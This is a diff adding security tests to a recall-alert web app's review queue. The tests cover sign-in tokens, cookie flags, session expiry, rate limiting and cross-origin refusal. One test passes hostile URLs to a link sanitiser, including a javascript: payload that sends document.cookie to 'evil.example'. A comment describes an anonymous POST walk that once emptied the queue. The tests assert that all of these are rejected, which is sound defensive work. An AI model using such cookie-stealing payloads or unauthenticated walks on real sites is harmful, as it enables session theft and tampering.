@@ -9,9 +9,42 @@ import { ConsoleSmsProvider, FlakySmsProvider } from '../src/sms.js';
 import { evaluate } from '../src/eval.js';
 import { normalizeUpc, normalizeBrand, productScore, lotMatches, contentTokens } from '../src/normalize.js';
 
+import { TOKEN_ENV } from '../src/auth.js';
+
 const FIXTURES = join(import.meta.dirname, '..', 'fixtures');
 const PAIRS = join(import.meta.dirname, '..', 'data', 'labelled-pairs.json');
 const NOW = '2026-03-25T09:00:00.000Z';
+const TEST_TOKEN = 'test-reviewer-token-long-enough';
+
+/** Sign in the way a coordinator does and return the cookie to send back. */
+async function signIn(base: string, token = TEST_TOKEN): Promise<string> {
+  const res = await fetch(`${base}/review/sign-in`, {
+    method: 'POST',
+    headers: { 'content-type': 'application/x-www-form-urlencoded' },
+    body: `token=${encodeURIComponent(token)}`,
+    redirect: 'manual',
+  });
+  const setCookie = res.headers.get('set-cookie');
+  if (!setCookie) throw new Error(`sign-in did not set a cookie (status ${res.status})`);
+  return setCookie.split(';')[0]!;
+}
+
+/** Start a server on an ephemeral port and always close it. */
+async function withServer(
+  db: Db,
+  opts: Record<string, unknown>,
+  fn: (base: string) => Promise<void>,
+): Promise<void> {
+  const { createServer } = await import('../src/server.js');
+  const server = createServer(db, opts);
+  await new Promise<void>((r) => server.listen(0, r));
+  const { port } = server.address() as { port: number };
+  try {
+    await fn(`http://127.0.0.1:${port}`);
+  } finally {
+    await new Promise<void>((r) => server.close(() => r()));
+  }
+}
 
 function seed(db: Db): void {
   db.prepare('INSERT INTO subscribers (phone, language, created_at) VALUES (?,?,?)')
@@ -467,7 +500,7 @@ describe('the review queue', () => {
     await ingestAll(db);
     runMatching(db, NOW);
 
-    const server = createServer(db, 'dana');
+    const server = createServer(db, { reviewer: 'dana', env: { [TOKEN_ENV]: TEST_TOKEN } });
     await new Promise<void>((r) => server.listen(0, r));
     const port = (server.address() as { port: number }).port;
     const base = `http://127.0.0.1:${port}`;
@@ -477,7 +510,8 @@ describe('the review queue', () => {
       expect(pub.status).toBe(200);
       expect(await pub.text()).toContain('Current recalls');
 
-      const review = await fetch(`${base}/review`);
+      const cookie = await signIn(base);
+      const review = await fetch(`${base}/review`, { headers: { cookie } });
       expect(await review.text()).toContain('Review queue');
 
       const id = nextForReview(db)!.match_id;
@@ -487,7 +521,7 @@ describe('the review queue', () => {
       // fixture set yields only one candidate and the queue is empty afterwards.
       await fetch(`${base}/review/${id}`, {
         method: 'POST',
-        headers: { 'content-type': 'application/x-www-form-urlencoded' },
+        headers: { 'content-type': 'application/x-www-form-urlencoded', cookie },
         body: 'decision=nonsense',
         redirect: 'manual',
       });
@@ -496,7 +530,7 @@ describe('the review queue', () => {
 
       const post = await fetch(`${base}/review/${id}`, {
         method: 'POST',
-        headers: { 'content-type': 'application/x-www-form-urlencoded' },
+        headers: { 'content-type': 'application/x-www-form-urlencoded', cookie },
         body: 'decision=not_a_match',
         redirect: 'manual',
       });
@@ -515,5 +549,281 @@ describe('the review queue', () => {
     const html = renderPublic(db);
     expect(html).not.toContain('+15550100');
     expect(html).not.toContain('watch_items');
+  });
+});
+
+// --- who is allowed to decide (hardening pass 2 and pass 4) -------------------
+
+/**
+ * These exist because the hardening prompt's Pass 2 and Pass 4 were run against a live server in
+ * R10 and both found the same hole. With no credential of any kind, an anonymous caller could
+ * POST decision=alert (queueing a text to a real phone) and could walk /review/1../review/8
+ * marking everything not_a_match until the queue read "Nothing to review" — which the empty state
+ * truthfully calls normal. Every test below reproduces one step of that walk and asserts it now
+ * fails.
+ */
+describe('the review queue refuses strangers', () => {
+  it('an unconfigured deployment will not open the queue at all, and says why', async () => {
+    await ingestAll(db);
+    runMatching(db, NOW);
+    await withServer(db, { env: {} }, async (base) => {
+      const get = await fetch(`${base}/review`);
+      expect(get.status).toBe(503);
+      const body = await get.text();
+      expect(body).toContain('No reviewer token is set');
+      // The refusal page must not leak the queue it is refusing to show.
+      expect(body).not.toContain('Infant Acetaminophen');
+
+      const post = await fetch(`${base}/review/1`, {
+        method: 'POST',
+        headers: { 'content-type': 'application/x-www-form-urlencoded' },
+        body: 'decision=alert',
+        redirect: 'manual',
+      });
+      expect(post.status).toBe(503);
+
+      // The public page is not behind the token and must keep working.
+      expect((await fetch(`${base}/`)).status).toBe(200);
+    });
+  });
+
+  it('a token too short to be a control is treated as no token', async () => {
+    await withServer(db, { env: { [TOKEN_ENV]: 'letmein' } }, async (base) => {
+      const res = await fetch(`${base}/review`);
+      expect(res.status).toBe(503);
+      expect(await res.text()).toContain('only 7 characters');
+    });
+  });
+
+  it('without the cookie the queue shows a sign-in form and no queue contents', async () => {
+    await ingestAll(db);
+    runMatching(db, NOW);
+    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
+      const body = await (await fetch(`${base}/review`)).text();
+      expect(body).toContain('Reviewer token');
+      // The specific thing that leaked: what a household said it has, and the recall itself.
+      expect(body).not.toContain('Infant Acetaminophen');
+      expect(body).not.toContain('What they said they have');
+    });
+  });
+
+  it('the exact anonymous walk that emptied the queue is now rejected', async () => {
+    await ingestAll(db);
+    runMatching(db, NOW);
+    const { pendingCount } = await import('../src/server.js');
+    const before = pendingCount(db);
+    expect(before).toBeGreaterThan(0);
+
+    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
+      for (const id of [1, 2, 3, 4, 5, 6, 7, 8]) {
+        const res = await fetch(`${base}/review/${id}`, {
+          method: 'POST',
+          headers: { 'content-type': 'application/x-www-form-urlencoded' },
+          body: 'decision=not_a_match',
+          redirect: 'manual',
+        });
+        expect(res.status).toBe(401);
+      }
+    });
+    expect(pendingCount(db)).toBe(before);
+  });
+
+  it('a wrong token is refused and a right one issues a locked-down cookie', async () => {
+    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
+      const wrong = await fetch(`${base}/review/sign-in`, {
+        method: 'POST',
+        headers: { 'content-type': 'application/x-www-form-urlencoded' },
+        body: 'token=hunter2',
+        redirect: 'manual',
+      });
+      expect(wrong.status).toBe(401);
+      expect(wrong.headers.get('set-cookie')).toBeNull();
+
+      const right = await fetch(`${base}/review/sign-in`, {
+        method: 'POST',
+        headers: { 'content-type': 'application/x-www-form-urlencoded' },
+        body: `token=${TEST_TOKEN}`,
+        redirect: 'manual',
+      });
+      expect(right.status).toBe(303);
+      const cookie = right.headers.get('set-cookie')!;
+      expect(cookie).toContain('HttpOnly');
+      expect(cookie).toContain('SameSite=Strict');
+      // The token itself must never be what is stored in the browser.
+      expect(cookie).not.toContain(TEST_TOKEN);
+    });
+  });
+
+  it('a valid cookie sent from another site is refused', async () => {
+    await ingestAll(db);
+    runMatching(db, NOW);
+    const { pendingCount } = await import('../src/server.js');
+    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
+      const cookie = await signIn(base);
+      const before = pendingCount(db);
+      const res = await fetch(`${base}/review/1`, {
+        method: 'POST',
+        headers: {
+          'content-type': 'application/x-www-form-urlencoded',
+          cookie,
+          origin: 'https://evil.example',
+        },
+        body: 'decision=alert',
+        redirect: 'manual',
+      });
+      expect(res.status).toBe(403);
+      expect(pendingCount(db)).toBe(before);
+    });
+  });
+
+  it('one client firing a hundred decisions gets cut off', async () => {
+    await ingestAll(db);
+    runMatching(db, NOW);
+    await withServer(db, { env: { [TOKEN_ENV]: TEST_TOKEN } }, async (base) => {
+      const cookie = await signIn(base);
+      const codes: number[] = [];
+      for (let i = 0; i < 100; i++) {
+        const res = await fetch(`${base}/review/1`, {
+          method: 'POST',
+          headers: { 'content-type': 'application/x-www-form-urlencoded', cookie },
+          body: 'decision=unclear',
+          redirect: 'manual',
+        });
+        codes.push(res.status);
+      }
+      const blocked = codes.filter((c) => c === 429);
+      expect(blocked.length).toBeGreaterThan(50);
+      // A human working at the fifteen-second target never reaches the limit.
+      expect(codes.filter((c) => c === 303).length).toBeGreaterThanOrEqual(30);
+    });
+  });
+
+  it('a session stops working once it expires', async () => {
+    const { mintSession, verifySession, readToken } = await import('../src/auth.js');
+    const state = readToken({ [TOKEN_ENV]: TEST_TOKEN });
+    const t0 = 1_700_000_000_000;
+    const session = mintSession(TEST_TOKEN, t0);
+    expect(verifySession(session, state, t0 + 60_000)).toBe(true);
+    expect(verifySession(session, state, t0 + 13 * 60 * 60 * 1000)).toBe(false);
+    // A session minted under a different token is not accepted either.
+    expect(verifySession(mintSession('a-completely-different-token', t0), state, t0)).toBe(false);
+    // Neither is a forged expiry.
+    const forged = `${t0 + 10 ** 10}.${session.split('.')[1]}`;
+    expect(verifySession(forged, state, t0)).toBe(false);
+  });
+});
+
+describe('a decision is not something a stranger or a stray click can undo', () => {
+  it('a decided record cannot be silently re-decided', async () => {
+    const { decide } = await import('../src/matchrun.js');
+    await ingestAll(db);
+    runMatching(db, NOW);
+    const m = db.prepare("SELECT id FROM matches WHERE confidence = 'candidate' LIMIT 1").get() as { id: number };
+
+    expect(decide(db, m.id, 'alert', 'dana', NOW)).toBe('recorded');
+    // The repeat POST that used to overwrite it.
+    expect(decide(db, m.id, 'not_a_match', 'stranger', NOW)).toBe('already_decided');
+
+    const after = db.prepare('SELECT decision, decided_by FROM matches WHERE id = ?').get(m.id) as Record<string, unknown>;
+    expect(after.decision).toBe('alert');
+    expect(after.decided_by).toBe('dana');
+
+    // Correcting a mistake is possible, but only deliberately.
+    expect(decide(db, m.id, 'not_a_match', 'dana', NOW, { overwrite: true })).toBe('recorded');
+    expect((db.prepare('SELECT decision FROM matches WHERE id = ?').get(m.id) as { decision: string }).decision)
+      .toBe('not_a_match');
+  });
+
+  it('deciding a match that does not exist reports so rather than doing nothing quietly', async () => {
+    const { decide } = await import('../src/matchrun.js');
+    expect(decide(db, 999_999, 'alert', 'dana', NOW)).toBe('no_such_match');
+  });
+});
+
+describe('"can\'t tell" defers a record instead of burying it', () => {
+  it('a skipped record stays in the queue and is offered again', async () => {
+    const { decide } = await import('../src/matchrun.js');
+    const { nextForReview, pendingCount, deferredCount } = await import('../src/server.js');
+    await ingestAll(db);
+    runMatching(db, NOW);
+
+    const before = pendingCount(db);
+    const row = nextForReview(db)!;
+    expect(decide(db, row.match_id, 'unclear', 'dana', NOW)).toBe('deferred');
+
+    // The whole point: the count does not go down and the record comes back.
+    expect(pendingCount(db)).toBe(before);
+    expect(deferredCount(db)).toBe(1);
+    const stored = db.prepare('SELECT decision, defer_count FROM matches WHERE id = ?')
+      .get(row.match_id) as { decision: string | null; defer_count: number };
+    expect(stored.decision).toBeNull();
+    expect(stored.defer_count).toBe(1);
+  });
+
+  it('a deferred record sorts behind anything nobody has looked at yet', async () => {
+    const { decide } = await import('../src/matchrun.js');
+    const { nextForReview } = await import('../src/server.js');
+    await ingestAll(db);
+    runMatching(db, NOW);
+
+    const ids = (db.prepare(
+      "SELECT id FROM matches WHERE confidence = 'candidate' AND decision IS NULL",
+    ).all() as { id: number }[]).map((r) => r.id);
+    if (ids.length < 2) {
+      // The fixture set yields one candidate; assert the single-record behaviour instead of
+      // silently passing. It must still come back, with the pass recorded.
+      const only = nextForReview(db)!;
+      decide(db, only.match_id, 'unclear', 'dana', NOW);
+      expect(nextForReview(db)?.match_id).toBe(only.match_id);
+      expect(Number(nextForReview(db)!.defer_count)).toBe(1);
+      return;
+    }
+    const first = nextForReview(db)!.match_id;
+    decide(db, first, 'unclear', 'dana', NOW);
+    expect(nextForReview(db)!.match_id).not.toBe(first);
+  });
+
+  it('the screen tells the next person it has already been passed over', async () => {
+    const { decide } = await import('../src/matchrun.js');
+    const { nextForReview, renderReview } = await import('../src/server.js');
+    await ingestAll(db);
+    runMatching(db, NOW);
+    decide(db, nextForReview(db)!.match_id, 'unclear', 'dana', NOW);
+    const html = renderReview(db);
+    expect(html).toContain('Passed over once already');
+    expect(html).not.toContain('Nothing to review');
+  });
+});
+
+describe('what the review screen is allowed to know', () => {
+  it('the phone number never leaves the database for this screen', async () => {
+    const { nextForReview, renderReview } = await import('../src/server.js');
+    await ingestAll(db);
+    runMatching(db, NOW);
+
+    const row = nextForReview(db)!;
+    // Pass 2.2: over-fetching is the leak, whether or not the view happens to render it.
+    // Asserting on the row rather than the HTML is the point — the previous version passed an
+    // HTML-only check while carrying the phone in a row typed `[k: string]: unknown`.
+    expect(JSON.stringify(row)).not.toContain('5550100');
+    expect(Object.keys(row)).not.toContain('phone');
+    expect(renderReview(db)).not.toContain('5550100');
+  });
+
+  it('a hostile URL in a recall feed cannot become a script link', async () => {
+    const { safeHref, renderPublic } = await import('../src/server.js');
+    expect(safeHref('https://www.fda.gov/x')).toBe('https://www.fda.gov/x');
+    expect(safeHref("javascript:fetch('//evil.example/'+document.cookie)")).toBeNull();
+    expect(safeHref('JavaScript:alert(1)')).toBeNull();
+    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBeNull();
+    expect(safeHref('')).toBeNull();
+    expect(safeHref('not a url at all')).toBeNull();
+
+    await ingestAll(db);
+    db.prepare("UPDATE recalls SET url = ? WHERE severity = 'high'").run('javascript:alert(1)');
+    const html = renderPublic(db);
+    expect(html).not.toContain('javascript:');
+    // And it does not render a broken empty link either — the notice line just has no link.
+    expect(html).not.toContain('href=""');
   });
 });
